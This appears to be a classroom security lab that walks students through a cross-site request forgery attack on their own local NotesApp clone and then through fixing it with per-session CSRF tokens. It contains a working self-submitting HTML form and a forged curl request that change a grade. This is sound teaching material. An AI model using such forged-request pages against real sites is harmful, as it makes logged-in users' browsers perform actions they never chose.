# Lab — Requests you never meant to send (CSRF), then make the app ask for proof

**Your job, in one hour:** build a web page that changes a grade **without touching NotesApp**. A
teacher who is logged in just **opens your page** — and their own browser sends the "change grade"
request for you. Then **close it**: make every form carry a secret that only NotesApp can print.
About 30 minutes, with your pair.

Last class, Eve's code ran **inside** the victim's page (stored XSS). Today Eve needs **no code in
NotesApp at all**. She only needs the victim's browser to send one request. One flaw: **cross-site
request forgery (CSRF), NotesApp flaw #11.**

!!! abstract "What you hand in — one forged request, then the fix"
    1. Proof that your page changed Eve's grade while a teacher was logged in (CSRF).
    2. Your fixed app, where the same forged request is **refused** (`400`).
    3. Proof the **real** teacher form still saves a grade after the fix.

!!! warning "Only your own app"
    You attack and fix **only** your own NotesApp clone, on your own machine. The accounts and grades
    here are seed data, not real people.

---

## The one idea for the whole hour

When you log in, NotesApp gives your browser a **session cookie**. After that, your browser
**attaches the cookie to every request to `localhost:8080` by itself** — even a request that a
**different website** asked it to send.

NotesApp only checks: *"is the cookie valid?"* It never checks: *"did this request come from **my**
form?"* So any page that makes your browser send a `POST /grades` gets that request accepted **as
you**.

Think of the cookie as a **festival wristband**. The bar serves anyone wearing a wristband. Eve
cannot get your wristband — but she can hand you a pre-filled order slip, "ten drinks on my tab",
and you walk it to the bar. The bar sees **your** wristband and serves it. The fix: the real order
slips carry a **secret stamp** that only the bar's own counter prints. A slip without the stamp is
refused, whoever carries it.

That stamp is the **CSRF token**.

---

## Part 1 — Prove the server trusts the cookie alone (≈ 6 min)

Start the app.

```bash
docker compose up -d
```

Eve is a student. Her Mathematics grade is **note 10**: `9.1`. She cannot write grades. Only a
teacher can. Log in as the Mathematics teacher and keep the cookie:

```bash
curl -s -c teacher.jar -d "username=prof.turing&password=teach123" \
     http://localhost:8080/login -o /dev/null -w "teacher login: HTTP %{http_code}\n"
```

Now send a "change grade" request with **only** the cookie — no form, no page, nothing from
NotesApp. We even claim it comes from another website (`Origin: http://evil.example`):

```bash
curl -s -b teacher.jar -H "Origin: http://evil.example" \
     -d "note_id=10&grade=20&comment=Perfect work." \
     http://localhost:8080/grades -o /dev/null -w "forged request: HTTP %{http_code}\n"
```

!!! question "Predict first — commit with your pair"
    `302` means "saved, go back to the teacher page". `400` or `403` means "refused". Which one do you
    expect? Write it down, then run the command.

Check Eve's dashboard:

```bash
curl -s -c eve.jar -d "username=eve&password=evepw" http://localhost:8080/login -o /dev/null
curl -s -b eve.jar http://localhost:8080/dashboard | grep -A2 "20.0"
```

!!! danger "Checkpoint — accepted"
    The forged request returns `302` and Eve now has `20.0` and *"Perfect work."* The server never
    asked where the request came from. A valid cookie was enough. That is flaw #11.

---

## Part 2 — Do it for real: a page the teacher only has to open (≈ 8 min)

Curl had the cookie because **you** gave it. A real attacker never sees the cookie. She makes the
**victim's browser** send the request. Make a new folder **outside** your NotesApp clone, and
create `prize.html` in it:

```html
<!doctype html>
<html><body>
<h1>Eve's project page</h1>
<p>Loading…</p>
<form id="f" action="http://localhost:8080/grades" method="POST">
  <input type="hidden" name="note_id" value="10">
  <input type="hidden" name="grade"   value="19.5">
  <input type="hidden" name="comment" value="Changed by Eve's page.">
</form>
<script>document.getElementById("f").submit();</script>
</body></html>
```

No button. The script submits the hidden form the moment the page opens.

Serve it as a **second website**, on another port:

```bash
python3 -m http.server 9000
```

Now play the teacher, **in your normal browser**:

1. Open <http://localhost:8080>, log in as **prof.turing / teach123**.
2. In the same browser, open Eve's link: <http://localhost:9000/prize.html>.

!!! question "Predict first"
    The teacher clicked **nothing** on NotesApp. They only opened a link. Does Eve's grade change?

!!! danger "Checkpoint — zero clicks"
    The page flashes, then you land on the NotesApp teacher page. Look at the **All grades** table:
    note 10 is now `19.5`, *"Changed by Eve's page."* The teacher's browser sent the request and
    attached the teacher's cookie by itself. Eve never touched NotesApp.

??? tip "Why is it called *cross-site*? (optional)"
    The request **starts** on one site (`localhost:9000`, Eve's page) and **lands** on another
    (`localhost:8080`, NotesApp). The browser happily sends it, with the cookie. *Forgery*: the
    request looks exactly like the teacher's own.

---

## Part 3 — The fix: a secret stamp on every real form (≈ 10 min)

The fix is **not** "check the Origin header" or "hope the browser blocks it". The server must
demand proof that the request came from **its own** form. Three small pieces in `web/app.py` and
the templates.

**3a. One random secret per session.** In `web/app.py`, add `import secrets` with the other imports.
Then, right after `app.secret_key = SECRET_KEY`, add:

```python
# Defence in depth: the browser keeps the session cookie off most cross-site POSTs.
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"


# --- CSRF protection (flaw #11) ---------------------------------------------
def csrf_token():
    """One random secret per session. Our own forms print it; other sites cannot read it."""
    if "csrf" not in session:
        session["csrf"] = secrets.token_urlsafe(32)
    return session["csrf"]


app.jinja_env.globals["csrf_token"] = csrf_token
```

**3b. Check it on every POST.** Just below:

```python
@app.before_request
def check_csrf():
    """Every state-changing POST must carry the session's token."""
    if request.method == "POST" and request.endpoint != "login":
        expected = session.get("csrf")
        sent = request.form.get("csrf_token", "")
        if not expected or not hmac.compare_digest(sent, expected):
            abort(400, "CSRF token missing or wrong")
```

!!! warning "Do not drop `not expected or`"
    Without it, a session that has **no** token yet compares `""` with `""` — and that is *equal*. The
    forged request passes. Fail closed: no expected token means refuse.

**3c. Print the stamp in every real form.** Add this line as the **first line inside every**
`<form method="post" …>` in `web/templates/teacher.html` (1 form) and `web/templates/admin.html`
(3 forms: delete, create, ping):

```html
<input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
```

Rebuild:

```bash
docker compose up -d --build
```

??? tip "Why can't Eve's page just copy the token? (optional)"
    The token is inside NotesApp's HTML. To read it, Eve's page would have to **read a response from
    `localhost:8080`** — and the browser forbids one site from reading another site's pages (the
    *same-origin policy*). Her page can **send** requests, blind. It can never **read** the answer.
    So it can never learn the stamp.

---

## Part 4 — Prove it: forged refused, real form works (≈ 6 min)

Log in again (the old cookie has no token), then replay Part 1's forged request:

```bash
curl -s -c teacher.jar -d "username=prof.turing&password=teach123" \
     http://localhost:8080/login -o /dev/null
curl -s -b teacher.jar -d "note_id=10&grade=20&comment=Perfect work." \
     http://localhost:8080/grades -o /dev/null -w "forged request: HTTP %{http_code}\n"
```

!!! success "Checkpoint — forged request refused"
    `forged request: HTTP 400`. No token, no write.

Now the **real** form path. A real teacher first **loads** the page (which prints the token), then
submits it:

```bash
TOKEN=$(curl -s -b teacher.jar -c teacher.jar http://localhost:8080/teacher \
        | grep -o 'name="csrf_token" value="[^"]*"' | head -1 | cut -d'"' -f4)
echo "token: $TOKEN"
curl -s -b teacher.jar \
     --data-urlencode "note_id=10" --data-urlencode "grade=9.1" \
     --data-urlencode "comment=Very strong final exam." \
     --data-urlencode "csrf_token=$TOKEN" \
     http://localhost:8080/grades -o /dev/null -w "real form: HTTP %{http_code}\n"
```

!!! success "Checkpoint — the real form still works"
    `real form: HTTP 302` — saved. Eve's grade is back to `9.1`.

Last, the browser test. Keep `python3 -m http.server 9000` running. Log in as **prof.turing** in
your browser, then open <http://localhost:9000/prize.html> again.

!!! success "Checkpoint — Eve's page is dead"
    You land on **Bad Request — CSRF token missing or wrong**. Note 10 does not change. Also save a
    grade with the real teacher form in the browser: it still works. Then log in as **admin** and use
    *Add user* and *Ping*: they still work too.

---

## What you hand in

```
CSRF FIX — NotesApp flaw #11 closed

  Break:  logged in as prof.turing, opened localhost:9000/prize.html
          note 10 became -> ____ (expect: 19.5, "Changed by Eve's page.")

  Fix:    per-session token (secrets.token_urlsafe), checked on every POST,
          hidden csrf_token field in teacher.html (1 form) + admin.html (3 forms)

  Closed: same page now -> ____ (expect: 400 Bad Request, grade unchanged)

  Real use still works: teacher saves a grade [ ]  admin adds a user [ ]  admin ping [ ]
```

Commit your fixed `web/app.py`, `web/templates/teacher.html` and `web/templates/admin.html`.

!!! tip "The deeper lesson — a cookie proves *who*, not *what they meant*"
    A cookie says **who** the browser belongs to. It says nothing about whether that person **chose**
    to send this request. For anything that changes data, the server must also check intent: a
    secret only its own pages hold. `SameSite=Lax` helps, but it is the browser's seatbelt — the
    server must not depend on it.

---

## Cleanup

```bash
docker compose down     # your data is kept in a volume
```

Stop the `http.server` with `Ctrl+C`.

## Troubleshooting

??? bug "After the fix, every save in the browser gives 400"
    A form is missing the hidden `csrf_token` line, or it is outside the `<form>` tag. Check every
    `<form method="post"` in `teacher.html` and `admin.html` — there are **four**. Rebuild with
    `docker compose up -d --build`.

??? bug "After the fix, my old curl commands from class 9 and 10 get 400"
    Correct — they post without a token. Fetch the page first and send its token, as in Part 4.
    The login form is exempt, so logging in with curl still works.

??? bug "In Part 2 nothing changed"
    Open the attack page as `http://localhost:9000/...` (not `127.0.0.1`, not `file://`), in the
    **same browser** where the teacher is logged in, and right after logging in. Some browsers keep
    cookies off requests that come from a really *different* site (`SameSite`). `localhost:9000` and
    `localhost:8080` count as the same site, so the cookie is sent. Real attackers use exactly this:
    a page on a sub-domain or a comment on the same site.

??? bug "Part 2 changed nothing and I see a login page"
    You are not logged in as a teacher in that browser — or you logged in as alice. Log in as
    **prof.turing**, then open the attack page again.

??? bug "The forged request still passes after the fix"
    Check the `not expected or` part of the check (see the warning in 3b), and that `check_csrf` has
    `@app.before_request` above it. Rebuild, log in again, retry.

---

??? note "Reference fix (open only if you are stuck or at the timer)"
    `web/app.py`:

    ```python
    import secrets   # with the other imports

    app.secret_key = SECRET_KEY
    app.config["SESSION_COOKIE_SAMESITE"] = "Lax"   # defence in depth

    def csrf_token():
        if "csrf" not in session:
            session["csrf"] = secrets.token_urlsafe(32)
        return session["csrf"]

    app.jinja_env.globals["csrf_token"] = csrf_token

    @app.before_request
    def check_csrf():
        if request.method == "POST" and request.endpoint != "login":
            expected = session.get("csrf")
            sent = request.form.get("csrf_token", "")
            if not expected or not hmac.compare_digest(sent, expected):
                abort(400, "CSRF token missing or wrong")
    ```

    `web/templates/teacher.html` (1 form) and `web/templates/admin.html` (3 forms), first line inside
    each `<form method="post" …>`:

    ```html
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    ```

    One idea: a valid cookie is not enough. The request must also carry a secret that only
    NotesApp's own pages print — and another site can never read it. Flask-WTF's `CSRFProtect` does
    the same job in one line, if you prefer a library.
